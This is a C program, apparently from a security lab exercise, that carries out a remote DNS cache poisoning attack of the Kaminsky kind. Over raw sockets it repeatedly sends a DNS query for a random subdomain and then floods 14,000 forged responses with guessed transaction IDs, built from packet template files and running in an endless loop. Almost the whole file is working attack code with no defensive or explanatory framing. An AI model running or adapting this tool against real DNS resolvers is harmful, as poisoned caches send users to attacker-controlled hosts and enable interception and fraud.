#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <netinet/in.h>

#define MAX_FILE_SIZE 1000000

/* IP Header (custom structure) */
struct ipheader {
    unsigned char      iph_ihl:4, // IP header length (in 32-bit words)
                       iph_ver:4; // IP version
    unsigned char      iph_tos;   // Type of service
    unsigned short int iph_len;   // IP Packet length (header + data)
    unsigned short int iph_ident; // Identification
    unsigned short int iph_flag:3, // Fragmentation flags
                       iph_offset:13; // Flags offset
    unsigned char      iph_ttl;   // Time to Live
    unsigned char      iph_protocol; // Protocol type (e.g., UDP)
    unsigned short int iph_chksum;   // IP datagram checksum
    struct in_addr     iph_sourceip; // Source IP address 
    struct in_addr     iph_destip;   // Destination IP address 
};

/* UDP header structure */
struct udpheader {
    unsigned short sport;
    unsigned short dport;
    unsigned short len;
    unsigned short chksum;
} __attribute__((packed));

/* Function to calculate a checksum (for IP header) */
unsigned short calculate_checksum(unsigned short *buf, int nbytes) {
    unsigned long sum = 0;
    while (nbytes > 1) {
        sum += *buf++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        sum += *(unsigned char*)buf;
    }
    // Fold 32-bit sum to 16 bits
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (unsigned short)(~sum);
}

/* Update the IP checksum for the packet and set UDP checksum to 0 */
void update_checksums(unsigned char *packet, int pkt_size) {
    struct ipheader *ip = (struct ipheader *) packet;
    int ip_header_len = ip->iph_ihl * 4;
    
    // Clear and recalculate the IP header checksum
    ip->iph_chksum = 0;
    ip->iph_chksum = calculate_checksum((unsigned short*) packet, ip_header_len);

    // For UDP, the checksum is optional in IPv4; set it to 0
    struct udpheader *udp = (struct udpheader *)(packet + ip_header_len);
    udp->chksum = 0;
}

/* Function prototypes for sending packets */
void send_raw_packet(char *buffer, int pkt_size);
void send_dns_request(unsigned char *packet, int size);
void send_dns_response(unsigned char *packet, int size);

int main() {
    long i = 0;
    int NUM_SPOOFED_PACKETS = 14000;
    srand(time(NULL));

    // Load the DNS request packet from file (template)
    FILE *f_req = fopen("ip_req.bin", "rb");
    if (!f_req) {
        perror("Can't open 'ip_req.bin'");
        exit(1);
    }
    unsigned char ip_req[MAX_FILE_SIZE];
    int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);
    fclose(f_req);

    // Load the DNS response packet from file (template)
    FILE *f_resp = fopen("ip_resp.bin", "rb");
    if (!f_resp) {
        perror("Can't open 'ip_resp.bin'");
        exit(1);
    }
    unsigned char ip_resp[MAX_FILE_SIZE];
    int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
    fclose(f_resp);

    char a[26] = "abcdefghijklmnopqrstuvwxyz";
    while (1) {
        unsigned short transaction_id = rand() % 65536;
        // Generate a random name with length 5
        char name[5];
        for (int k = 0; k < 5; k++) {
            name[k] = a[rand() % 26];
        }
        // --- Prepare and send the DNS request ---
        memcpy(ip_req + 41, name, 5);               // Update the subdomain in the request
        unsigned short tid_net = htons(transaction_id);
        memcpy(ip_req + 28, &tid_net, 2);             // Update the transaction ID
        update_checksums(ip_req, n_req);              // Recalculate IP checksum; set UDP checksum to 0
        send_dns_request(ip_req, n_req);

        // --- Prepare and send the spoofed DNS responses ---
        memcpy(ip_resp + 41, name, 5);                // Update subdomain (first occurrence)
        memcpy(ip_resp + 64, name, 5);                // Update subdomain (second occurrence)
        for (int j = 0; j < NUM_SPOOFED_PACKETS; j++) {
            transaction_id = rand() % 65536;
            tid_net = htons(transaction_id);
            memcpy(ip_resp + 28, &tid_net, 2);
            update_checksums(ip_resp, n_resp);       // Update IP checksum; set UDP checksum to 0
            send_dns_response(ip_resp, n_resp);
        }
    }
    return 0;
}

/* Send the DNS request packet */
void send_dns_request(unsigned char *packet, int size) {
    send_raw_packet((char *)packet, size);
}

/* Send the forged DNS response packet */
void send_dns_response(unsigned char *packet, int size) {
    send_raw_packet((char *)packet, size);
}

/* Send the raw packet out */
void send_raw_packet(char *buffer, int pkt_size) {
    struct sockaddr_in dest_info;
    int enable = 1;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
        perror("setsockopt() error");
        exit(1);
    }

    struct ipheader *ip = (struct ipheader *) buffer;
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    if (sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0) {
        perror("sendto() error");
    }
    close(sock);
}
